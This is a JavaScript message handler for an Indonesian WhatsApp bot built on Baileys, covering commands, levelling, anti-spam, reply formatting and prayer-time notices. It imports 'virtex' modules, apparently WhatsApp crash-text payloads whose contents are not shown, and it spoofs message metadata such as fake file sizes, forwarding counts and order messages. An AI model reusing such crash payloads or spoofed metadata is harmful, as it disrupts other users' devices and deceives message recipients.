
"use strict";
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("baileys")
const toMs = require('ms')
const chalk = require('chalk')
const fs = require("fs")
const fse = require('fs-extra');
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn, execSync } = require("child_process")
const axios = require("axios");
const yts = require("yt-search");
const gtts = require( 'node-gtts')
const ggs = require('google-it')
const canvacard = require("canvacard");
const speed = require("performance-now");
const ms = require("parse-ms");
const ytdl = require('ytdl-core');
const os = require('os');
const { join,dirname } = require('path');
const path = require('path');
const { removeBackgroundFromImageFile } = require('remove.bg')
const { performance } = require('perf_hooks')
const QRCode = require('qrcode');
const fetch = require('node-fetch');
const cheerio = require( 'cheerio')
const request = require("request")
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { youtubeSearch, mediafiredl,  lyricsv2,  lyrics, facebookdl, facebookdlv2, tiktokdl, tiktokdlv2, twitterdl, twitterdlv2, getZodiac, liputan6, googleIt, wallpaperv2, chord, googleImage,  jadwalTVNow,  gempa,  stickerTelegram, stickerLine, latinToAksara, aksaraToLatin, asmaulhusnajson, alquran, listJadwalSholat, gempaNow, instagramdl, instagramdlv3, instagramdlv2, instagramStory, savefrom, snapsave } = require('@bochilteam/scraper')

//----------------- LIB FILE ------------------\\
const { getDateId, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId } = require("../lib/user");
const TicTacToe = require("../lib/tictactoe")
const { msgFilter, addSpam, SpamExpired, cekSpam} = require('../lib/antispam')
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("../lib/badword.js")
const {bad,thanks,ken,dosa,katamalem,katasiang,katasore,katalopyu,ohayo,devoloper1,teksspam,tekssalah,katara,katabot,katakawai,kataaii,ppTolak,ppLimit,badword} = require('../message/messages')
const {vnToxic,vnMenu,vnSalam,vnAra, vnBot,vnSpam,vnPagi,vnSiang,vnMalam,vnOwner, vnKawai, vnLove} = require('../message/autovn.js')
const { stikOtw,stikSpam,stikAdmin,stikTagOwn,stikBug } = require('../temp/sticker/autosticker.js')
const { color } = require('../lib/color')
//const photooxy = require('../lib/photooxy');
const {formatp,parseMention, resize, getRandom,generateProfilePicture, getCase,addCase,delCase,listCase,runtime,FileSize,h2k, GIFBufferToVideoBuffer,isNumber,makeid,kyun,randomNomor,jsonformat, isUrl, fetchJson, sleep,getBuffer,} = require("../lib/myfunc");
const {floNime, UploadFileUgu, TelegraPh} = require('../lib/uploader')
const { mediafiredll, instagram2, cekkuota, tele, ytPlayMp4, ytPlayMp3, textpro,igdl, kodepos, pinterest, mediafire, ffstalk, mlstalk, Tiktok, surah,listsurah,getSurah,tafsirsurah, ephoto, emoji} = require('../lib/scraper') 
const { addblockcmd, deleteblockcmd, checkblockcmd } = require ("../lib/blockcmd");
const { addError,clearAllError, deleteError, checkError } = require("../lib/totalerror")
const { Nothing,Failed,Succes,addAutoClear,autoClearChat, checkDataName, createDataId, addDataId, removeDataId, checkDataId, getHit, cmdAdd, expiredCmd } = require("../lib/totalcmd");
const _sewa = require('../lib/sewa')
const _prem = require("../lib/premium");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("../lib/banned")
const { addSaldo, minSaldo, cekSaldo } = require("../lib/deposit");

// ====== STORAGE =======//
const imagenya = JSON.parse(fs.readFileSync('./json/image.json'))
const videonya = JSON.parse(fs.readFileSync('./json/video.json'))
const thumb = fs.readFileSync('./stik/thumb.jpeg')
// VIRTEX BY TSUKASA
const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('../virtex/virtex.js')
const { virtex6 } = require('../virtex/virtex6.js')
const { virtex7 } = require('../virtex/virtex7.js')
//----------------- MESSAGE FILE ------------------\\
let { dada } = require("../message/sewabot.js")
const {register} = require("./register.js")
// ======== STORE & TOP UP ======= //
let db_saldo = JSON.parse(fs.readFileSync("./database/saldo.json"));
let depositPath = "./database/deposit/"
let topupPath = "./database/topup/"
const isResPanel= JSON.parse(fs.readFileSync("./database/reselerpanel.json"))
//database
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const premium = db.data.premium
const listcmdblock = db.data.blockcmd 
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard 
const anonChat = db.data.anonymous 
const allcommand = db.data.allcommand 
const sewa = db.data.sewa
const _toxic =  db.data.toxic 
const spammer = []

var publik = true
//=================================================//
module.exports = async(hanz, m, chatUpdate, store,quotedMsg) => {
//console.log(chatUpdate.messages[0].message)

var Ownerin ="628388198229@s.whatsapp.net"
var ownerNumber = [`${nomerOwner}@s.whatsapp.net` ,`${hanz.user.jid}`]
const Tnow = (new Date()/1000).toFixed(0)
const seli = Tnow - m.messageTimestamp
if (seli > Intervalmsg) return console.log((`Pesan ${Intervalmsg} detik yang lalu diabaikan agar tidak nyepam`))
try {

// Destructuring properti dari objek m
const { type, now, args, sender, fromMe,from,botNumber,senderNumber,groupName,groupId,groupMembers,groupDesc,groupOwner,pushname,itsMe,isGroup,mentionByTag,mentionByReply,users,budy,content,body,} = m

if (multi){
  var prefix = /^#.!¦|\\^/.test(body) ? body.match(/^#.!¦|\\^/gi) : '.'
var thePrefix = "Multi Prefix"
} 
const isCmd = body.startsWith(prefix)
const isCommand = isCmd? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() :""
const q = args.join(' ');
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const isOwner = ownerNumber.includes(sender) || checkDataId ("owner", sender, DataId) 
const command = isOwner? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
const theOwner = sender == Ownerin 
const timestampp = speed();
const latensi = speed() - timestampp
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const Input = (mentionByTag && mentionByTag[0]) ? mentionByTag[0] : (mentionByReply || q ? numberQuery : false);
const replyCommand = isCmd? isCmd : allcommand.includes(toFirstCase(command))
const selectedButton = (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : ''
const user = global.db.data.users[m.sender]
const chat = isGroup? global.db.data.chats[m.chat] : false
const anonChat = db.data.anonymous 
const kickon = global.db.data.kickon[m.chat]
const botRun = global.db.data.others['runtime']
const botTime = botRun? (new Date - botRun.runtime) :  "Tidak terdeteksi"
const runTime = clockString(botTime)
const toJSON = j => JSON.stringify(j, null,'\t')
//  REGISTER TERLEBIH DAHULU  //
register(m,makeid,isCmd,isOwner,groupName)

// Auto Read Nya
 if (autoRead) {
    hanz.readMessages([m.key]);
}

// Security / Keamanan
const groupMetadata = isGroup ? await hanz.groupMetadata(m.chat).catch(e => null) : null;
const participants = groupMetadata ? groupMetadata.participants : [];
const groupAdmins = participants.length ? participants.filter(v => v.admin !== null).map(v => v.id) : [];

const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupOwner = isGroup ? m.isRAdmin : false
const isGroupAdmins = isGroup ? m.isAdmin : false
const isKickarea = isGroup ? db.data.chats[from].antiasing : false
const isBanchat = isGroup ? db.data.chats[from].banchat : false
const isAntiNsfw = isGroup ? db.data.chats[from].nsfw : false
const isBanned = sender? cekBannedUser (senderNumber, ban) : false
const isSimi = isGroup ? db.data.chats[from].simi : false
const isGame = isGroup ? db.data.chats[from].game : false
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const gcount = isPremium ? gcounti.prem : gcounti.user

// Ucapan Waktu
let ucapanWaktu;

if (timeWib < "06:00:00") {
    ucapanWaktu = '🌅 Selamat pagi!';
} else if (timeWib < "11:00:00") {
    ucapanWaktu = '☀️ Selamat pagi!';
} else if (timeWib < "15:00:00") {
    ucapanWaktu = '🌞 Selamat siang!';
} else if (timeWib < "18:00:00") {
    ucapanWaktu = '🌇 Selamat sore!';
} else if (timeWib < "19:00:00") {
    ucapanWaktu = '🌙 Selamat malam!';
} else {
    ucapanWaktu = '🌌 Selamat malam!';
}
// Date Islamic
let dot = new Date(new Date + 3600000)
const dateIslamic = Intl.DateTimeFormat("id" + '-TN-u-ca-islamic', {day: 'numeric',month: 'long',year: 'numeric'}).format(dot)

  // Pp ini mah
try {
var ppimg = await hanz.profilePictureUrl(sender, 'image').catch(_ => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60')
} catch (err) {
console.log(err)
}
const its = await getBuffer (ppimg)
// ======= Public & Self And Banchat ======= //
if (!publik && !itsMe && !isOwner && !theOwner) return 
if (isGroup && isBanchat) {
if (!itsMe && !isOwner) return 
}
// Presence Online
if (isCmd){
hanz.sendPresenceUpdate('composing', from)
} else {
hanz.sendPresenceUpdate('available', from)
}
    
 // PICK RANDOM 
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  hanz.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  hanz.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: m})
}
const math = (teks) => {
return Math.floor(teks)
}  

//User 
const userLevel = user? db.data.users[m.sender].level : true
const userExp = user? db.data.users[m.sender].exp : true
const userId = user? db.data.users[m.sender].id : true
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 10000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = user? db.data.users[m.sender].date : true

//Hadiah Balance 
let anune =`${userLevel}0000`
let susu = randomNomor(anune)
db.data.users[sender].balance += susu


//Hadiah Limit
if(userLevel >= 25){
let anuitu =`${userLevel}`
var sapi = randomNomor(anuitu)
db.data.users[sender].limit += sapi
} else {
var sapi = "0"
}

// Auto level users
if (user && isCmd && userExp >= requiredExp) {
    let link = 'https://telegra.ph/file/9528a0b81d1b46bdb5507.jpg';
    let level = userLevel + 1;
    let uang = 1000 * level;

    db.data.users[m.sender].exp = userExp - requiredExp;
    db.data.users[m.sender].level += 1;
    db.data.users[m.sender].money += uang;

    let mentions = [sender];
    let text = `*「 LEVEL UP 」*\n\n^-^ Omedatou *${pushname}*\nKamu telah naik level menjadi level *${userLevel} ➠ ${userLevel + 1}*\nBonus Saldo : Rp *${uang.toLocaleString()}*\nPangkat Saat Ini : *${userLeveling(`${db.data.users[sender].level + 1}`)}*\n\n*Note:* ↓\nGunakan saldo untuk membeli limit tambahan dengan fitur ${prefix}buylimit`;

    let ppimg = await hanz.profilePictureUrl(sender, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png');
    let its = await getBuffer(ppimg);
    let persenya = `${userPersen}`;

    const canvacord = require("canvacord");
let image3 = new canvacord.Rank()
    .setAvatar(its)
    .setCurrentXP(Math.floor(userExp)) // Pastikan 'math()' dikoreksi menjadi 'Math.floor()'
    .setRequiredXP(requiredExp)
    .setStatus("online")
    .setProgressBar("#FFFFFF", "COLOR") // Depan putih (#FFFFFF), belakang biru (#0000FF)
    .setBackground("COLOR", "#A0C8D0") // Mengubah background menjadi biru (#0000FF)
    .setCustomStatusColor("#ff1a8c")
    .setUsername(`EXP: ${persenya.split(".")[0]}%,`)
    .setLevel(userLevel)
    .setRank(4)
    .setOverlay("#A4D3EE") // Overlay menjadi putih (#FFFFFF)
    .setDiscriminator("0007");


    let foto = await getRandom(".png");
    image3.build()
        .then(async data => {
            await canvacord.write(data, foto);
            let gambar = await fs.readFileSync(foto);

            await hanz.sendMessage(from, { image: gambar, caption: text, mentions }, { quoted: m });
            await fs.unlinkSync(foto);
        });
}
 
  
//FAKE REPLY  
require("./alfake.js")(m,pushname,sender,ucapanWaktu,body)

 // FUNCTION SETREPLY 
const setReply = async(teks,member = []) =>{
let gambar = [
"https://pomf2.lain.la/f/y60mzd6o.jpg",
"https://pomf2.lain.la/f/t3jqp4ej.jpg",
"https://pomf2.lain.la/f/64xz8fun.jpg"
]
let photo = pickRandom(gambar)

let contextInfo = {
forwardingScore: 99999,
isForwarded: true,
mentionedJid: member,
forwardedNewsletterMessageInfo: {
newsletterJid,
serverMessageId: 100,
newsletterName
 },
externalAdReply:{
showAdAttribution: true,
title: botName,
body:`Runtime ${runTime}`,
previewType:"GIF",
thumbnailUrl:photo,
sourceUrl: `${web}`
}
}

  if(replyType === "web"){
  hanz.sendMessage(from, {contextInfo, gifPlayback: true,text: teks}, { quoted: m})

  } else if(replyType === "web2"){
  hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, mediaType: 3,  renderLargerThumbnail : false,thumbnailUrl: photo,sourceUrl: `https://wa.me/${nomerOwner}?text=Hallo+kak`}}, text: teks},{quoted: m})
  } else if(replyType === "mess"){
  hanz.sendMessage(from, { id: m.key.id, contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true,text: teks },{quoted: m});
  } else if(replyType === "katalog"){
const { generateWAMessageFromContent } = require("baileys")
let prep = generateWAMessageFromContent(m.chat, { orderMessage: { 
itemCount: 20000, 
status: 50000,
surface: 999,
message: Ehztext(teks),
description: '^^',
orderTitle: 'ʙᴇᴊɪʀ ᴅᴇᴋ',
token: '91B0793EDA208DDF0BF0882227662F3A',
mediaType: 1,
curreyCode: 'IDR',
totalCurrencyCode: 20.000,
totalAmount1000: '50000',
sellerJid: '628388198229@s.whatsapp.net',
thumbnail: thumb, 
sourceUrl: `${web}`
}}, {contextInfo: null, quoted: m})
hanz.relayWAMessage(prep)		
  } else if(replyType === "document"){hanz.sendMessage(m.chat, {
	document: fs.readFileSync("./package.json"),
	fileName: '© ɴᴀʜɪᴅᴀ - ᴍᴅ',
	mimetype: "application/vnd.ms-excel",
	fileLength: 999999999,
	bpageCount: 10903,	
  //jpegThumbnail: fs.readFileSync('./stik/thumbnaildokumen.jpg'),
  caption: Ehztext(teks),
  contextInfo: {
  mentionedJid: [sender],
forwardingScore: 9999999, 
isForwarded: true, 
  externalAdReply: {
	showAdAttribution: false,
	title: botName,
	body: `${ucapanWaktu} kak ${pushname}`,
	thumbnailUrl: photo,
	mediaType: 1,
  sourceUrl: `${web}`,
	}}}, { quoted: m,ephemeralExpiration: 86400});
  } else {
  hanz.sendMessage(from, {text: "Error SetReply Tidak Di Temukan"})
  }
  }
//Message
const reply = (teks) => {
hanz.sendMessage(from, { contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true,text: teks },{quoted: m})
}
const sendvn = (teks) => {
    hanz.sendMessage(from, {
        audio: { url: teks },
        ptt: true,
        waveform: [0, 0, 50, 0, 0, 0, 10, 80, 10, 60, 10, 99, 60, 30, 10, 0, 0, 0],
        mimetype: 'audio/mpeg',
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId: 100,
            newsletterName
        }
    }, { quoted: m });
};

const sendvn1 = (teks, m) => {
    hanz.sendMessage(from, {
        audio: { url: teks },
        mimetype: 'audio/mpeg',
        ptt: true,
        contextInfo: {
           
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid,
                serverMessageId: 20,
                newsletterName,
            },
            
        }
    }, { quoted: m });
}

const sendSticker = (teks) => {
hanz.sendMessage(from, {sticker: {url: teks}},{quoted: m})
}
const sendGif = (teks, teksnya) => {
hanz.sendMessage(from, { video: teks, caption: "Nih!",gifPlayback: true},{quoted: m})
};        
const sendMusic = (teks) => {
let img = { url : pickRandom(fotoRandom), type : "image/jpeg" }
let url = `https://www.youtube.com/@rangelbot`

let contextInfo = {
externalAdReply: {
showAdAttribution: false, 
renderLargerThumbnail : false,
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
body: `   ━━━━⬤──────────    `,
description: 'Now Playing ....',
mediaType: 2,
thumbnailUrl: img.url,
mediaUrl: url
}
}
	
hanz.sendMessage(from, { contextInfo, mimetype: 'audio/mp4', audio: teks}, { quoted: m })
}
const sendTolak = (teks) => {
    let contextInfo = {
        forwardingScore: 999,
        isForwarded: true,
        mentionedJid: [m.sender],
        externalAdReply: {
         showAdAttribution: true,
         title: pushname,
            body: 'Akses Di Tolak ❌',
            previewType: "PHOTO",
            thumbnail: fs.readFileSync('./stik/danied.jpeg'),
            sourceUrl: syt
        }
    };

    const message = Ehztext(`${teks}\n${readmore}\n`
        + `⫹⫺ @${sender.split('@')[0]}\n`
        + `⫹⫺ ${week}, ${calender}`);

    hanz.sendMessage(from, { contextInfo, text: message }, { quoted: m });
};
// SendAnti
  const sendAnti = (teks) => {
  let contextInfo = {
  mentionedJid: [sender],
  externalAdReply: {
  forwardingScore: 999,
  isForwarded: true,
  title: `${botName}`,
  body: `${baileysVersion}`,
  mediaType: 2,
  thumbnail: its,
  mediaUrl: `${syt}`
  }
  }

  hanz.sendMessage(from, { contextInfo, text: `${teks}\n`+readmore+`\n⫹⫺ @${sender.split('@')[0]}\n⫹⫺ ${week} , ${calender}`}, { quoted: m })
  }
  // SendButDoc
 const sendButDoc = async (teks, display_text, id) => {
    let { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require('baileys');
    const fs = require('fs');
    const preparedMedia = await prepareWAMessageMedia({
        document: fs.readFileSync('./package.json'), 
        fileLength: 1000000000, 
        fileName: `${wm}`, 
    }, { upload: hanz.waUploadToServer });
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        externalAdReply: {
                            showAdAttribution: false,
                            renderLargerThumbnail: false,
                            title: `${botName}`,
                            mediaType: 1,
                            body: `Hai ${ucapanWaktu} Kak ${pushname}`,
                            thumbnail: thumb,
                            sourceUrl: `${web}`, 
                        }
                    },
    body: proto.Message.InteractiveMessage.Body.create({
  text: teks    }),
     footer: proto.Message.InteractiveMessage.Footer.create({
    text: `${wm}`   }),
      header: proto.Message.InteractiveMessage.Header.create({
                        title: null, 
                        thumbnail: thumb,
                        subtitle: null,
                        hasMediaAttachment: true,
                        ...preparedMedia 
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"${display_text}","id":"${prefix}${id}"}`
                            },
                        ]
                    })
                })
            }
        }
    }, { userJid: m.sender, quoted: m });

    // Mengirim pesan
    await hanz.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
};
// sendButImage
const sendButImg = async (teks, Url,display_text, id) => {
      const { proto, generateWAMessageFromContent,prepareWAMessageMedia } = require('baileys');
            let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `\`${teks}\``
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: null
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false,
           ...await prepareWAMessageMedia({ image: { url: `${Url}`} }, { upload: hanz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text":"${display_text}","id":"${prefix}${id}"}`
              }
              ],
          })
        })
    }
  }
}, {quoted: m, userJid: m})

hanz.relayMessage(m.chat, msg.message, {
  messageId: msg.key.id,
}) };
// sendButVideo
const sendButVid = async (teks,Url, display_text, id) => {
      const { proto, generateWAMessageFromContent,prepareWAMessageMedia } = require('baileys');
            let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `\`${teks}\``
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: null
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false,
           ...await prepareWAMessageMedia({ video: { url: `${Url}` } }, { upload: hanz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text":"${display_text}","id":"${prefix}${id}"}`
              }
              ],
          })
        })
    }
  }
}, {quoted: m, userJid: m})

hanz.relayMessage(m.chat, msg.message, {
  messageId: msg.key.id,
}) };
// SendButDaftar
const sendButDaftar = async () => {
  let tekDftar = `${gris1}✨ Halo ${pushname}! ✨\n\nSepertinya kamu belum terdaftar Di Hatiku🫠. Ayo bergabung dan nikmati berbagai fitur istimewa yang sudah kami siapkan hanya untukmu! 🎉\n\nUntuk mendaftar, cukup ketik perintah berikut dengan format:\n\n.Daftar Nama.Umur\n\nContoh:\n.daftar Ehanz.19${gris1}`;
sendTolak(tekDftar)
}
  
          
            
// Reply Edit

    hanz.editmsg = async (e, t) => {
        var a = [`${e}.`, `${e}..`, `${e}...`, `${e}....`, `${t}`];
        let { key: s } = await hanz.sendMessage(m.chat, { text: e });

        for (let r = 0; r < a.length; r++) {
            await hanz.sendMessage(m.chat, { text: a[r], edit: s });
        }
    }


//××××××××× MEEAAGE ××××××××//

require("./listmenu.js")
require("./message.js")(senderNumber, prefix,command,setReply)
 
  //======= CONTOH MEDIA ========//
let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessageV')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
const pesilit = (type === 'conversation' && m.message.conversation) ? m.message.conversation : (type == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (type == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (type == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : ''

const messagesD = pesilit.slice(0).trim().split(/ +/).shift().toLowerCase()
const messagesC = pesilit.slice(0).trim()


// ========= SYSTEM EXPIRED ======== //

_sewa.expiredCheck(hanz, sewa)
_prem.expiredCheck(premium) 

// ======= CONSOLE LOG ========= //

const idConsole = isGroup ? m.chat : m.sender; // Menggunakan ID grup jika di grup, dan ID nomor jika private chat
const timeConsole = moment.tz('Asia/Jakarta').format('HH:mm');
    
if (!isGroup && !isCmd) {
    console.log(chalk.bgGreenBright(chalk.black("[PRIVATE]")), color(budy, "cyan"), color('📝 dari', 'gold'), color(`${pushname}`, 'orange'));
    console.log(color('📞 ID:', 'cyan'), color(idConsole, 'lightgreen'));
    console.log(color(`⏰ Waktu: ${timeConsole}`, "pink"));
}

if (isGroup && !isCmd) {
    console.log(chalk.bgMagenta(chalk.white("[GROUP]")), 
        color(budy, "cyan"), 
        color('📝 dari', 'gold'), 
        color(`${pushname}`, 'orange'), 
        color('💬 Di Group:', 'purple'), 
        color(groupName, "deeppink"));
    console.log(color('📞 ID:', 'cyan'), color(idConsole, 'lightgreen')); // ID on a new line
    console.log(color(`⏰ Waktu: ${timeConsole}`, "lime"));
}

if (!isGroup && isCmd) {
    console.log(chalk.bgYellow(chalk.black("[COMMAND]")), 
        color(`${command} [${args.length}]`, 'cyan'), 
        color('📝 dari', 'gold'), 
        color(`${pushname}`, 'orange'));
    console.log(color('📞 ID:', 'cyan'), color(idConsole, 'lightgreen')); // ID on a new line
    console.log(color(`⏰ Waktu: ${timeConsole}`, "lime"));
}

if (isGroup && isCmd) {
    console.log(chalk.bgYellow(chalk.black("[COMMAND]")), 
        color(`${command} [${args.length}]`, 'cyan'), 
        color('📝 dari', 'gold'), 
        color(`${pushname}`, 'orange'), 
        color('💬 Di Group:', 'purple'), 
        color(groupName, "deeppink"));
    console.log(color('📞 ID:', 'cyan'), color(idConsole, 'lightgreen')); // ID on a new line
    console.log(color(`⏰ Waktu: ${timeConsole}`, "lime"));
}

// AUTO RESPON SIMI VIA REPLY/TAG BOT
if (isSimi) {
    const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage');
    const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage');
    const mentionByReplySticker = type == "stickerMessage" && m.message.stickerMessage.contextInfo != null ? m.message.stickerMessage.contextInfo.participant || "" : "";
    const sender = m.key.participant || m.participant;  // Pengirim pesan

    // Pastikan pesan bukan dari bot itu sendiri
    if (m.key.fromMe) return;  // Cek jika pesan dikirim oleh bot sendiri

    // Jika bot ditag atau pesan mengandung bot number
    if ((Input == botNumber && isGroup && !replyCommand && !isAudio) || 
        (mentionByReplySticker == botNumber && isSticker && !replyCommand)) {
        
        try {
            // Jika pesan adalah stiker yang di-reply atau quoted stiker
            if (isQuotedReplySticker || isReplySticker) {
                let namastc = await pickRandom(Object.keys(db.data.sticker));
                hanz.sendMessage(from, { sticker: { url: db.data.sticker[namastc].link } }, { quoted: m });
            } else {
                // Respon teks umum
                let jawab = ["Afa iyah 🗿", "Oh", "Aku ga ngerti om 🐦", "Boong", "🗿", "🐦", "Oh gitu 🐦"];
                let teks1 = pickRandom(jawab);
                let teks2 = body;
                let hasil = [`${teks1}`, `${teks2}`];
                let random = pickRandom(hasil);
                
                let kata = body.replace(`@${botNumber.split("@")[0]}`, "");
                let kato = ["Kenapa ?", "Ha ?", "Napa tag gua ?", "napa ?", "ya ?", "apa ?", "Hmm ?"];
                let acak = pickRandom(kato);

                if (kata == "") return hanz.sendMessage(from, { text: acak }, { quoted: m });

                // Ambil jawaban dari Simsimi API
                let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${body}&lc=id`);
                let sami = simi.success;

                // Jika Simsimi tidak mengerti, gunakan teks acak
                if (sami.startsWith("Aku tidak mengerti")) {
                    var teksnya = random;
                } else {
                    var teksnya = sami;
                }

                hanz.sendMessage(from, { text: teksnya }, { quoted: m });
            }
        } catch (err) {
            console.error(err);
            return;
        }
    }
}

                
                
// AUTO BIO BOT
if (autoBio) {
    let data = global.db.data.others['runtime'];
    let time = (new Date() - data.runtime);
    let bio = `Im ${botName} 🤖 || ⏰ Runtime ${clockString(time)} || 🌎 Mode: ${publik ? 'Public' : 'Self'} || 🎨 Create By ${ownerName}`;
    
    await hanz.updateProfileStatus(bio).catch(err => console.error(err));
    //autoBio.status = new Date() * 1;
}

//AUTO REACT
let regex =[ "bilek","banh","cum","kntl","anjing","mmk","bang","wibu","pantek","pepek","hentai"]
for (let i of regex){
if (!cekSpam("NotCase",senderNumber, AntiSpam) && isGroup && budy.toLowerCase().includes(i)){ 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
let emot = await pickRandom(["🗿", "👍", "🙄", "😝", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "🔥", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
hanz.sendMessage(from, { react: { text: emot, key: m.key } })	
}
}
// AUTO READ & REACT SW
    if (m.key.remoteJid == "status@broadcast") return hanz.sendMessage(m.key.remoteJid, { react: { text: '😹', key:  m.key } }, { statusJidList: [m.key.participant, m.sender] }).catch(() => {
        false
        });
// AUTO SHOLAT 
hanz.autoshalat = hanz.autoshalat ? hanz.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? hanz.user.id : m.sender
	let id = m.chat 
    if(id in hanz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '08:00',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = Ehztext(`Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Tasikmalaya dan sekitarnya._`)
    hanz.autoshalat[id] = [
    setReply(caption),
    setTimeout(async () => {
    delete hanz.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }
    //ANTI STICKER Banstik
let antiSticker = db.data.others["antiSticker"]
if(antiSticker) {
} else db.data.others["antiSticker"]  = []
